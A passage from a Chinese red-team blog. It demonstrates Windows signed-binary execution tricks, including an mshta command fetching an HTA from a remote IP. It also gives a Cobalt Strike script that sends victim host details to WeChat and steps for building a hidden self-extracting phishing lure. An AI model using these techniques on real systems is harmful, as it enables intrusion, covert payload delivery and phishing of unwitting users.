<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe url.dll,OpenURL calc.exe</span><br><span class="line">rundll32.exe url.dll,FileProtocolHandler calc.exe</span><br><span class="line">rundll32.exe zipfldr.dll, RouteTheCall calc.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810142457880.png" alt="image-20200810142457880"></p>
<p> 除了直接加载exe，也可以通过如下方式加载。</p>
<p> 首先编写一个.url文件，文件内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[InternetShortcut]</span><br><span class="line">URL&#x3D;c:\windows\system32\calc.exe</span><br></pre></td></tr></table></figure>

<p> 使用rundll32加载url文件执行exe</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe ieframe.dll,OpenURL  C:\Users\jerry\Desktop\test.url</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810145839888.png" alt="image-20200810145839888"></p>
<p><strong>如何使用rundll32执行其他脚本？</strong></p>
<p> <strong>加载js文件</strong></p>
<p> 首先准备一个js文件，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WScript.Echo(&quot;1&quot;);</span><br></pre></td></tr></table></figure>

<p> 使用rundll32加载js文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe url.dll,OpenURL C:\Users\jerry\Desktop\test.js</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810150344638.png" alt="image-20200810150344638"></p>
<p> <strong>加载hta文件</strong></p>
<p> 准备一个hta文件，内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;HTML&gt; </span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;HEAD&gt; </span><br><span class="line">&lt;script language&#x3D;&quot;VBScript&quot;&gt;</span><br><span class="line">Window.ReSizeTo 0, 0</span><br><span class="line">Window.moveTo -2000,-2000</span><br><span class="line">Set objShell &#x3D; CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">objShell.Run &quot;calc.exe&quot;</span><br><span class="line">self.close</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">demo</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;HEAD&gt; </span><br><span class="line">&lt;&#x2F;HTML&gt;</span><br></pre></td></tr></table></figure>

<p> 使用如下命令加载hta文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe url.dll,OpenURLA  C:\Users\jerry\Desktop\test.hta</span><br></pre></td></tr></table></figure>

<p><strong>如何使用rundll32加载远程文件？</strong></p>
<p> 通过调用WScript.shell组件加载mshta.exe远程加载exe命令执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;C:&#x2F;Windows&#x2F;System32&#x2F;mshta.exe http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:8011&#x2F;test.hta&quot;,0,true);self.close();</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810151759209.png" alt="image-20200810151759209"></p>
<h3 id="pubprn-vbs-利用失败"><a href="#pubprn-vbs-利用失败" class="headerlink" title="pubprn.vbs(利用失败)"></a>pubprn.vbs(利用失败)</h3><p> 我在windows10下测试，命令如下,提示找不到路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:http:&#x2F;&#x2F;xxxx:8011&#x2F;test.sct</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810155430373.png" alt="image-20200810155430373"></p>
<p> 在2012中进行测试，发现虽然会可以找到这个路径进行加载，但是不会执行sct文件。</p>
<h3 id="Odbcconf"><a href="#Odbcconf" class="headerlink" title="Odbcconf"></a>Odbcconf</h3><p> ODBCCONF.exe是一个命令行工具，它允许您配置ODBC驱动程序和数据源名称,可能在以后的版本会删除,可以使用PowerShell命令来管理驱动程序和数据源。使用ODBCCONF可以加载任意的dll文件</p>
<p> 首先准备一个dll文件，使用如下命令进行加载</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">odbcconf.exe &#x2F;a &#123;regsvr C:\shell.dll&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810161025395.png" alt="image-20200810161025395"></p>
<p> 需要注意生成的dll文件要和系统的版本对应，否则执行会报错</p>
<h3 id="winrm"><a href="#winrm" class="headerlink" title="winrm"></a>winrm</h3><p> winrm.vbs（一个位于system32目录下的具有Windows签名的脚本文件）可以被用来调用用户定义的XSL文件，从而导致任意的、没有签名的代码执行。</p>
<p><strong>如何利用winrm执行？</strong></p>
<p> 首先创建一个目录，并且将cscript.exe复制到这个目录下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy c:\Windows\System32\cscript.exe xxx</span><br></pre></td></tr></table></figure>

<p> 准备一个WsmPty.xsl文件，也放到该目录下，文件内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;</span><br><span class="line">&lt;stylesheet</span><br><span class="line">xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;XSL&#x2F;Transform&quot; xmlns:ms&#x3D;&quot;urn:schemas-microsoft-com:xslt&quot;</span><br><span class="line">xmlns:user&#x3D;&quot;placeholder&quot;</span><br><span class="line">version&#x3D;&quot;1.0&quot;&gt;</span><br><span class="line">&lt;output method&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line">	&lt;ms:script implements-prefix&#x3D;&quot;user&quot; language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line">	&lt;![CDATA[</span><br><span class="line">	var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;calc&quot;);</span><br><span class="line">	]]&gt; &lt;&#x2F;ms:script&gt;</span><br><span class="line">&lt;&#x2F;stylesheet&gt;</span><br></pre></td></tr></table></figure>

<p> 使用如下命令运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript.exe &#x2F;&#x2F;nologo C:\Windows\System32\winrm.vbs get wmicimv2&#x2F;Win32_Process?Handle&#x3D;4 -format:pretty</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810164336074.png" alt="image-20200810164336074"></p>
<h3 id="regasm"><a href="#regasm" class="headerlink" title="regasm"></a>regasm</h3><p> RegAsm读取程序集中的元数据，并将所需项添加到注册表中。注册表允许 COM 客户端以透明方式创建 .NET Framework 类。 在注册一个类之后，任何 COM 客户端都可以像使用 COM 类一样使用它。 类仅在安装程序集时注册一次。 只有实际注册程序集中的类实例之后才能从 COM 中创建它们。</p>
<p><strong>如何利用？</strong></p>
<p> 首先使用CS生成一个C#的shellcode，将shellcode插入到<a href="https://cangqingzhe.github.io/2020/08/06/关于windows执行shellcode的方式学习/[https://www.c0bra.xyz/2020/02/03/白名单-RegAsm-RegSvcs的利用/](https://www.c0bra.xyz/2020/02/03/白名单-RegAsm-RegSvcs的利用/)">文章</a>提供的模板中，使用如下命令编译运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe &#x2F;target:library &#x2F;out:test.dll regasm.cs</span><br></pre></td></tr></table></figure>

<p> 将生成的dll放置到目标主机上，使用下面的命令加载执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe &#x2F;U test.dll</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810172923452.png" alt="image-20200810172923452"></p>
<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810172937554.png" alt="image-20200810172937554"></p>
<h3 id="Pcalua"><a href="#Pcalua" class="headerlink" title="Pcalua"></a>Pcalua</h3><p> Pcalua是Windows进程兼容性助理(Program Compatibility Assistant)的一个组件。</p>
<p><strong>如何使用？</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pcalua -m -a calc.exe</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/06/%E5%85%B3%E4%BA%8Ewindows%E6%89%A7%E8%A1%8Cshellcode%E7%9A%84%E6%96%B9%E5%BC%8F%E5%AD%A6%E4%B9%A0/image-20200810182402572.png" alt="image-20200810182402572"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p> 通过上面的学习，我们可以发现在windows下能执行文件的方式挺多的，但是我们稍微区分一下可以根据是否可以远程加载文件进行区分，可以加载远程文件的方式可以对钓鱼提供某种便利</p>
<p><strong>支持远程加载</strong></p>
<ul>
<li>regsvr32</li>
<li>MSHTA</li>
<li>CMSTP</li>
<li>msiexec</li>
<li>wmic</li>
<li>msxsl</li>
<li>WSC</li>
<li>rundll32（通过调用其他方式远程加载）</li>
</ul>
<p><strong>参考</strong></p>
<p><a href="https://pentestlab.blog/page/5/?s=applocker" target="_blank" rel="noopener">pentestlab</a></p>
<p><a href="https://www.ired.team/offensive-security/code-execution/t1216-signed-script-ce" target="_blank" rel="noopener">ired</a></p>
<p><a href="https://www.cnblogs.com/backlion/" target="_blank" rel="noopener">渗透测试中心</a></p>
<p><a href="https://cangqingzhe.github.io/2020/08/06/关于windows执行shellcode的方式学习/[https://micro8.github.io/Micro8-HTML/Chapter1/71-80/72_基于白名单Installutil.exe执行payload第二季.html](https://micro8.github.io/Micro8-HTML/Chapter1/71-80/72_基于白名单Installutil.exe执行payload第二季.html)">专注 APT 攻击与防御</a></p>
<p><a href="https://blog.csdn.net/God_XiangYu/article/details/106111296" target="_blank" rel="noopener">【免杀篇】远控免杀专题(46)-白名单IEexec.exe执行payload(VT免杀率25-69)</a></p>
<p><a href="https://cangqingzhe.github.io/2020/08/06/关于windows执行shellcode的方式学习/[https://3gstudent.github.io/3gstudent.github.io/关于利用rundll32执行程序的分析/](https://3gstudent.github.io/3gstudent.github.io/关于利用rundll32执行程序的分析/)">关于利用rundll32执行程序的分析</a></p>
<p><a href="https://cangqingzhe.github.io/2020/08/06/关于windows执行shellcode的方式学习/[https://www.c0bra.xyz/2020/02/03/白名单-RegAsm-RegSvcs的利用/](https://www.c0bra.xyz/2020/02/03/白名单-RegAsm-RegSvcs的利用/)">白名单-RegAsm/RegSvcs的利用</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/08/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/08/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">关于CS上线微信通知的学习</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2020-08-01 09:30:19 / Modified: 10:37:29" itemprop="dateCreated datePublished" datetime="2020-08-01T09:30:19+08:00">2020-08-01</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">好好学习，天天向上</span><br></pre></td></tr></table></figure>

<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​    有时候渗透中我们可能需要对一些目标进行钓鱼，常用的就是使用邮件进行钓鱼，但是邮件钓鱼有一个问题，就是实时性不高，可能我们发了邮件，目标很久才会点，如果目标上线后我们没有及时进行利用或者权限维持，等我们再去看可能目标已经丢了，再想让目标点击上线已经不容易了，这就导致我们之前所做的事情功亏一篑，因此我们需要某种方法，让我们能随时知道目标是否上线，也不用一直盯着电脑。</p>
<p>​    经过查找网上的资料，发现已经有人实现了通过server酱和CS扩展脚本来让目标上线后进行微信提醒的功能。</p>
<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><h4 id="server酱申请"><a href="#server酱申请" class="headerlink" title="server酱申请"></a>server酱申请</h4><p><strong>什么是server酱？</strong></p>
<p>​    简单来讲就是推送服务器警报到手机的工具。</p>
<p><strong>怎么使用？</strong></p>
<ol>
<li>登入：用GitHub账号<a href="http://sc.ftqq.com/?c=github&a=login" target="_blank" rel="noopener">登入网站</a>，就能获得一个<a href="http://sc.ftqq.com/?c=code" target="_blank" rel="noopener">SCKEY</a>（在「<a href="http://sc.ftqq.com/?c=code" target="_blank" rel="noopener">发送消息</a>」页面）</li>
<li>绑定：点击「<a href="http://sc.ftqq.com/?c=wechat&a=bind" target="_blank" rel="noopener">微信推送</a>」，扫码关注同时即可完成绑定</li>
<li>发消息：往 <a href="http://sc.ftqq.com/SCKEY.send" target="_blank" rel="noopener">http://sc.ftqq.com/SCKEY.send</a> 发GET请求，就可以在微信里收到消息啦</li>
</ol>
<p><strong>绑定过程</strong></p>
<p>​    首先我们访问<a href="http://sc.ftqq.com/?c=github&a=login" target="_blank" rel="noopener">地址</a>使用github进行授权登录，登录成功后访问<a href="http://sc.ftqq.com/?c=code" target="_blank" rel="noopener">地址</a>获取SCKEY，如下</p>
<p><img src="/2020/08/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801094439398.png" alt="image-20200801094439398"></p>
<p>​    然后访问<a href="http://sc.ftqq.com/?c=wechat&a=bind" target="_blank" rel="noopener">微信推送</a>扫码关注进行绑定,微信扫描后点击“检查结果并确认绑定”</p>
<p><img src="/2020/08/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801094641509.png" alt="image-20200801094641509"></p>
<p>​    绑定成功后界面如下：</p>
<p><img src="/2020/08/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801094745848.png" alt="image-20200801094745848"></p>
<p>​    绑定成功后可以访问<a href="http://sc.ftqq.com/?c=code" target="_blank" rel="noopener">地址</a>发送消息进行测试。</p>
<p><img src="/2020/08/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801094922473.png" alt="image-20200801094922473"></p>
<p>​    点击发送的同时，即可在微信上接收到结果。</p>
<p><img src="/2020/08/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801095019358.png" alt="image-20200801095019358"></p>
<p>​    当然我们也可以调用接口来发送消息，如果是发送一个get请求，访问如下链接即可发送,这里的SCKEY是我们申请到的SCKEY,实际使用的过程中需要将其替换。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;sc.ftqq.com&#x2F;SCKEY.send?text&#x3D;%E4%B8%BB%E4%BA%BA%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%88%E6%8C%82%E6%8E%89%E5%95%A6~</span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801095324207.png" alt="image-20200801095324207"></p>
<p><img src="/2020/08/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801095413716.png" alt="image-20200801095413716"></p>
<p><strong>如何调用接口发送正文？</strong></p>
<p>​    通过GET方式访问接口确实可以发送消息，不过使用GET发送的请求没有正文，或者说正文长度会受到长度限制，我们可以通过POST请求来进行发送，只需要添加一个desp参数即可。</p>
<p><img src="/2020/08/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801100120759.png" alt="image-20200801100120759"></p>
<p><img src="/2020/08/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801100656685.png" alt="image-20200801100656685"></p>
<h4 id="结合CS完成上线提醒"><a href="#结合CS完成上线提醒" class="headerlink" title="结合CS完成上线提醒"></a>结合CS完成上线提醒</h4><p>​    当我们配置好server酱是不是觉得上线微信提醒非常简单呢，是的，接下来我们需要做的，就是写一个插件，当CS上线的时候，只需要提交一个POST请求，将上线的主机发送给我们就可以的，虽然说起来比较简单，但是像我这种菜水水是不会写CS插件的，幸好已经有大佬写好了插件了，代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># 循环获取所有beacon</span><br><span class="line">on beacon_initial &#123;</span><br><span class="line"></span><br><span class="line">	sub http_get &#123;</span><br><span class="line">		local(&#39;$output&#39;);</span><br><span class="line">		$url &#x3D; [new java.net.URL: $1];</span><br><span class="line">		$stream &#x3D; [$url openStream];</span><br><span class="line">		$handle &#x3D; [SleepUtils getIOHandle: $stream, $null];</span><br><span class="line"></span><br><span class="line">		@content &#x3D; readAll($handle);</span><br><span class="line"></span><br><span class="line">		foreach $line (@content) &#123;</span><br><span class="line">			$output .&#x3D; $line . &quot;\r\n&quot;;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		println($output);</span><br><span class="line">	&#125;</span><br><span class="line">	#获取ip、计算机名、登录账号</span><br><span class="line">	$internalIP &#x3D; replace(beacon_info($1, &quot;internal&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line">	$userName &#x3D; replace(beacon_info($1, &quot;user&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line">    $computerName &#x3D; replace(beacon_info($1, &quot;computer&quot;), &quot; &quot;, &quot;_&quot;);</span><br><span class="line">	</span><br><span class="line">	#get一下Server酱的链接</span><br><span class="line">	$url &#x3D; &#39;https:&#x2F;&#x2F;sc.ftqq.com&#x2F;此处填写你Server酱的SCKEY码.send?text&#x3D;CobaltStrike%e4%b8%8a%e7%ba%bf%e6%8f%90%e9%86%92&amp;desp&#x3D;%e4%bb%96%e6%9d%a5%e4%ba%86%e3%80%81%e4%bb%96%e6%9d%a5%e4%ba%86%ef%bc%8c%e4%bb%96%e8%84%9a%e8%b8%8f%e7%a5%a5%e4%ba%91%e8%b5%b0%e6%9d%a5%e4%ba%86%e3%80%82%0D%0A%0D%0Aip:&#39;.$internalIP.&#39;%0D%0A%0D%0A%e7%94%a8%e6%88%b7%e5%90%8d:&#39;.$userName.&#39;%0D%0A%0D%0A%e8%ae%a1%e7%ae%97%e6%9c%ba%e5%90%8d:&#39;.$computerName;</span><br><span class="line">	</span><br><span class="line">	http_get($url);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    我们看下代码，其实也确实非常简单，首先写了一个循环获取beacon的代码,beacon_initial方法可以理解为给新的Beacons会话添加一个自动运行的脚本，或者是让所有的新会话都运行一遍写好的脚本。当有新的会话加入就会自动加载。</p>
<p>​    作者在beacon_initial自定义了发送get请求的函数，通过beacon_info获取一些基本的主机，最后调用接口进行发送。</p>
<p>​    最后我们替换get请求位置的SCKEY为我们申请的key，使用CS加载插件进行测试，当设备上线的同时，我们也接收到了微信的通知。</p>
<p><img src="/2020/08/01/%E5%85%B3%E4%BA%8ECS%E4%B8%8A%E7%BA%BF%E5%BE%AE%E4%BF%A1%E9%80%9A%E7%9F%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20200801103207065.png" alt="image-20200801103207065"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>​    之前我认为要实现微信上线自动提醒这种功能是非常难的，但是还是有人通过这种非常简单的方式实现了这个功能，所以还是多去尝试某些东西，即使可能会失败。</p>
<p><strong>参考文章</strong></p>
<p><a href="http://www.nmd5.com/?p=567" target="_blank" rel="noopener">Cobalt Strike 上线微信提醒</a></p>
<p><a href="http://sc.ftqq.com/3.version" target="_blank" rel="noopener">server酱</a></p>
<p><a href="https://xz.aliyun.com/t/6188" target="_blank" rel="noopener">CobaltStrike插件开发官方指南 Part3</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/07/31/%E5%85%B3%E4%BA%8E%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/07/31/%E5%85%B3%E4%BA%8E%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA/" class="post-title-link" itemprop="url">关于自解压文件创建</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-07-31 10:42:09" itemprop="dateCreated datePublished" datetime="2020-07-31T10:42:09+08:00">2020-07-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-08-03 11:04:23" itemprop="dateModified" datetime="2020-08-03T11:04:23+08:00">2020-08-03</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">记录自解压文件创建的过程及遇到的问题</span><br></pre></td></tr></table></figure>

<h3 id="创建过程"><a href="#创建过程" class="headerlink" title="创建过程"></a>创建过程</h3><p>首先准备好我们想要创建自解压的文件，我这里的内容如下</p>
<p><img src="/2020/07/31/%E5%85%B3%E4%BA%8E%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA/image-20200731104349737.png" alt="image-20200731104349737"></p>
<p>选中这两个文件进行压缩，配置压缩的文件名和压缩选项。</p>
<p><img src="/2020/07/31/%E5%85%B3%E4%BA%8E%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA/image-20200731104546076.png" alt="image-20200731104546076"></p>
<p>选择“高级”–》”常规“，设置解压后的路径,我这里选择的是temp目录下 </p>
<p><img src="/2020/07/31/%E5%85%B3%E4%BA%8E%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA/image-20200731104902294.png" alt="image-20200731104902294"></p>
<p>然后再选择”设置“，在设置程序-》提取后运行中输入想要运行的内容，我是希望能同时运行exe和pdf文件，先试试直接写上去行不行，不行的话就得创建一个bat来同时运行。</p>
<p><img src="/2020/07/31/%E5%85%B3%E4%BA%8E%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA/image-20200731105125451.png" alt="image-20200731105125451"></p>
<p>再选择模式-》全部隐藏。</p>
<p><img src="/2020/07/31/%E5%85%B3%E4%BA%8E%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA/image-20200731105320926.png" alt="image-20200731105320926"></p>
<p>还需要设置更新选项，这里需要选择 ”跳过已经存在的文件“，否则如果目标第二次运行这个文件，就会跳出一个框，让目标选择是否替换文件，可能会导致暴露。</p>
<p><img src="/2020/07/31/%E5%85%B3%E4%BA%8E%E8%87%AA%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA/image-20200731110711963.png" alt="image-20200731110711963"></p>
<p>然后我们需要修改一下图标，我在网上下载了一个图标进行添加</p>
